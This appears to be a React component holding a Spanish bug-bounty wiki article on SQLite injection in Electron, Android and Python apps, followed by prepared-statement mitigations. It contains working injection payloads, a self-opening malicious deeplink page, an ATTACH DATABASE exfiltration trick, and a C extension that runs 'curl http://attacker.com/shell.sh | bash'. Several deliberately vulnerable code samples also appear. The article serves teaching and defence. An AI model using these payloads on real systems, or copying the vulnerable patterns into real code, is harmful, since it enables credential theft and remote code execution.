/**
 * SQLITE LOCAL INJECTION
 * Explotar SQLite en aplicaciones desktop y móviles
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Smartphone, Database, FileText, Shield, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function SqliteLocalInjectionContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="SQLite en Apps Locales">
        <Paragraph>
          SQLite es la base de datos más usada en <Strong>aplicaciones móviles</Strong> (Android/iOS) 
          y <Strong>apps desktop</Strong> (Electron). Aunque la base de datos esté "local", 
          las vulnerabilidades de inyección SQL siguen siendo explotables y peligrosas.
        </Paragraph>

        <AlertWarning title="Vectores de Ataque Locales">
          <ul className="mt-2 space-y-1">
            <ListItem>📱 Apps móviles que procesan deeplinks/URLs personalizadas</ListItem>
            <ListItem>💾 Apps Electron con IPC inseguro</ListItem>
            <ListItem>📄 Apps que importan archivos CSV/JSON maliciosos</ListItem>
            <ListItem>🔐 Password managers con búsqueda vulnerable</ListItem>
          </ul>
        </AlertWarning>
      </Section>

      <Section id="electron-injection" title="1. Injection en Apps Electron">
        <Subsection title="Escenario Vulnerable">
          <CodeBlock
            language="javascript"
            title="main.js - Proceso principal de Electron"
            code={`const { app, ipcMain } = require('electron');
const sqlite3 = require('sqlite3').verbose();
const db = new sqlite3.Database('./app.db');

// ❌ VULNERABLE - IPC handler sin validación
ipcMain.handle('search-notes', async (event, searchTerm) => {
  return new Promise((resolve, reject) => {
    // Concatenación directa = vulnerable
    db.all(
      \`SELECT * FROM notes WHERE content LIKE '%\${searchTerm}%'\`,
      (err, rows) => {
        if (err) reject(err);
        else resolve(rows);
      }
    );
  });
});`}
          />
        </Subsection>

        <Subsection title="Exploit desde Renderer Process">
          <CodeBlock
            language="javascript"
            title="renderer.js - Exfiltrar datos"
            code={`// En la app, un atacante puede inyectar via campo de búsqueda
const maliciousSearch = "' UNION SELECT username, password, email FROM users --";

const results = await window.electronAPI.searchNotes(maliciousSearch);

// Resultado: obtiene credenciales de TODOS los usuarios
console.log(results);
// [
//   { username: 'admin', password: 'hashed_password_here', email: 'admin@app.com' },
//   { username: 'user1', password: 'another_hash', email: 'user@app.com' }
// ]`}
          />

          <AlertDanger title="Impacto">
            Un atacante puede extraer TODA la base de datos local, incluyendo credenciales, 
            tokens de sesión, claves de cifrado, etc.
          </AlertDanger>
        </Subsection>
      </Section>

      <Section id="android-injection" title="2. SQLite en Android">
        <Subsection title="Código Vulnerable en Android">
          <CodeBlock
            language="java"
            title="NotesActivity.java - Búsqueda vulnerable"
            code={`public class NotesActivity extends AppCompatActivity {
    private SQLiteDatabase db;
    
    private void searchNotes(String query) {
        // ❌ VULNERABLE - rawQuery con concatenación
        String sql = "SELECT * FROM notes WHERE title LIKE '%" + query + "%'";
        Cursor cursor = db.rawQuery(sql, null);
        
        if (cursor.moveToFirst()) {
            do {
                String title = cursor.getString(0);
                String content = cursor.getString(1);
                displayNote(title, content);
            } while (cursor.moveToNext());
        }
        cursor.close();
    }
}`}
          />
        </Subsection>

        <Subsection title="Payload via Deeplink">
          <Paragraph>
            Un atacante puede crear una URL maliciosa que la app procese:
          </Paragraph>

          <CodeBlock
            language="html"
            title="Página web maliciosa"
            code={`<!DOCTYPE html>
<html>
<body>
  <h1>Click para abrir la app</h1>
  <a href="myapp://search?q=' UNION SELECT password, '', '' FROM users WHERE username='admin' --">
    Ver resultados
  </a>
  
  <script>
    // Auto-abrir el deeplink
    window.location = "myapp://search?q=' UNION SELECT password, '', '' FROM users WHERE username='admin' --";
  </script>
</body>
</html>`}
          />

          <AlertWarning>
            Cuando la víctima haga clic, la app procesa el payload y extrae la contraseña.
          </AlertWarning>
        </Subsection>

        <Subsection title="Attach Database para Exfiltración">
          <CodeBlock
            language="sql"
            title="Payload - Copiar datos a archivo accesible"
            code={`' ; ATTACH DATABASE '/sdcard/Download/leaked.db' AS leaked; 
CREATE TABLE leaked.passwords AS SELECT * FROM users; 
DETACH DATABASE leaked; --

-- El atacante puede luego acceder a /sdcard/Download/leaked.db`}
          />
        </Subsection>
      </Section>

      <Section id="load-extension" title="3. RCE con LOAD_EXTENSION">
        <AlertDanger title="SQLite permite cargar extensiones .so/.dll">
          Si <InlineCode>SQLITE_ENABLE_LOAD_EXTENSION</InlineCode> está habilitado, 
          puedes cargar librerías nativas y ejecutar código arbitrario.
        </AlertDanger>

        <Subsection title="Crear Extensión Maliciosa">
          <CodeBlock
            language="c"
            title="evil.c - Extensión SQLite maliciosa"
            code={`#include <sqlite3ext.h>
#include <stdlib.h>
SQLITE_EXTENSION_INIT1

// Esta función se ejecuta al cargar la extensión
int sqlite3_extension_init(
  sqlite3 *db, 
  char **pzErrMsg, 
  const sqlite3_api_routines *pApi
){
  SQLITE_EXTENSION_INIT2(pApi);
  
  // ¡Ejecutar comando del sistema!
  system("curl http://attacker.com/shell.sh | bash");
  
  return SQLITE_OK;
}`}
          />

          <TerminalOutput title="Compilar extensión">
            {`gcc -shared -fPIC -o evil.so evil.c

# En macOS:
gcc -dynamiclib -o evil.dylib evil.c

# En Windows:
gcc -shared -o evil.dll evil.c -lsqlite3`}
          </TerminalOutput>
        </Subsection>

        <Subsection title="Payload de Explotación">
          <CodeBlock
            language="sql"
            title="Cargar extensión maliciosa"
            code={`'; SELECT load_extension('/tmp/evil.so'); --

-- En Windows:
'; SELECT load_extension('C:\\Users\\Public\\evil.dll'); --`}
          />

          <AlertInfo>
            El atacante primero necesita escribir el archivo <InlineCode>.so/.dll</InlineCode> en disco. 
            Esto puede hacerse con:
            <ul className="mt-2 space-y-1">
              <ListItem>Subir archivo via funcionalidad de import</ListItem>
              <ListItem>Escribir usando <InlineCode>ATTACH DATABASE</InlineCode></ListItem>
              <ListItem>Social engineering (víctima descarga archivo)</ListItem>
            </ul>
          </AlertInfo>
        </Subsection>
      </Section>

      <Section id="csv-injection" title="4. CSV Import Injection">
        <Subsection title="Apps que Importan CSV">
          <Paragraph>
            Muchas apps permiten importar datos desde CSV. Si el import usa SQL dinámico, 
            podemos inyectar payloads en el CSV:
          </Paragraph>

          <CodeBlock
            language="csv"
            title="malicious.csv - Datos maliciosos"
            code={`name,email,notes
John Doe,john@example.com,Normal note
Admin,' UNION SELECT password FROM users WHERE username='admin' --,Malicious`}
          />

          <CodeBlock
            language="python"
            title="app.py - Import vulnerable"
            code={`import sqlite3
import csv

def import_csv(filename):
    conn = sqlite3.connect('app.db')
    cursor = conn.cursor()
    
    with open(filename, 'r') as f:
        reader = csv.DictReader(f)
        for row in reader:
            # ❌ VULNERABLE - f-string con datos del CSV
            query = f"""
                INSERT INTO contacts (name, email, notes) 
                VALUES ('{row['name']}', '{row['email']}', '{row['notes']}')
            """
            cursor.execute(query)
    
    conn.commit()
    conn.close()`}
          />
        </Subsection>
      </Section>

      <Section id="mitigacion" title="Mitigación Completa">
        <AlertDanger title="✅ Usar Prepared Statements SIEMPRE">
          Todos los lenguajes tienen soporte para queries parametrizadas.
        </AlertDanger>

        <Subsection title="Electron / Node.js">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - better-sqlite3"
            code={`const Database = require('better-sqlite3');
const db = new Database('./app.db');

ipcMain.handle('search-notes', async (event, searchTerm) => {
  // ✅ SEGURO - Prepared statement
  const stmt = db.prepare('SELECT * FROM notes WHERE content LIKE ?');
  const results = stmt.all(\`%\${searchTerm}%\`);
  return results;
});

// ✅ También seguro con named parameters
const insertStmt = db.prepare('INSERT INTO notes (title, content) VALUES (@title, @content)');
insertStmt.run({ title: userTitle, content: userContent });`}
          />
        </Subsection>

        <Subsection title="Android / Java">
          <CodeBlock
            language="java"
            title="✅ SEGURO - query() con selectionArgs"
            code={`public class NotesActivity extends AppCompatActivity {
    private SQLiteDatabase db;
    
    private void searchNotes(String query) {
        // ✅ SEGURO - Usar query() con placeholders
        Cursor cursor = db.query(
            "notes",                                    // tabla
            new String[]{"title", "content"},          // columnas
            "title LIKE ?",                            // WHERE con placeholder
            new String[]{"%" + query + "%"},           // valores (escapados automáticamente)
            null, null, null
        );
        
        if (cursor.moveToFirst()) {
            do {
                String title = cursor.getString(0);
                String content = cursor.getString(1);
                displayNote(title, content);
            } while (cursor.moveToNext());
        }
        cursor.close();
    }
    
    // ✅ SEGURO - Insert con ContentValues
    private void insertNote(String title, String content) {
        ContentValues values = new ContentValues();
        values.put("title", title);
        values.put("content", content);
        db.insert("notes", null, values);
    }
}`}
          />
        </Subsection>

        <Subsection title="Python">
          <CodeBlock
            language="python"
            title="✅ SEGURO - sqlite3 con placeholders"
            code={`import sqlite3

def search_notes(search_term):
    conn = sqlite3.connect('app.db')
    cursor = conn.cursor()
    
    # ✅ SEGURO - Usar ? como placeholder
    cursor.execute(
        "SELECT * FROM notes WHERE content LIKE ?",
        (f'%{search_term}%',)  # Tuple de parámetros
    )
    
    results = cursor.fetchall()
    conn.close()
    return results

def insert_contact(name, email, notes):
    conn = sqlite3.connect('app.db')
    cursor = conn.cursor()
    
    # ✅ SEGURO - Named placeholders
    cursor.execute(
        "INSERT INTO contacts (name, email, notes) VALUES (:name, :email, :notes)",
        {'name': name, 'email': email, 'notes': notes}
    )
    
    conn.commit()
    conn.close()`}
          />
        </Subsection>

        <Subsection title="Deshabilitar LOAD_EXTENSION">
          <CodeBlock
            language="javascript"
            title="Node.js - Deshabilitar extensiones"
            code={`const sqlite3 = require('sqlite3').verbose();
const db = new sqlite3.Database('./app.db');

// ✅ Deshabilitar carga de extensiones (por defecto está deshabilitado)
// No llamar a db.loadExtension()`}
          />

          <CodeBlock
            language="python"
            title="Python - Deshabilitar extensiones"
            code={`import sqlite3

conn = sqlite3.connect('app.db')

# ✅ Asegurar que load_extension esté deshabilitado
conn.enable_load_extension(False)  # Por defecto es False`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: Firebase Misconfiguration</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/firebase-misconfiguration`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Explotar Firebase sin autenticación</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
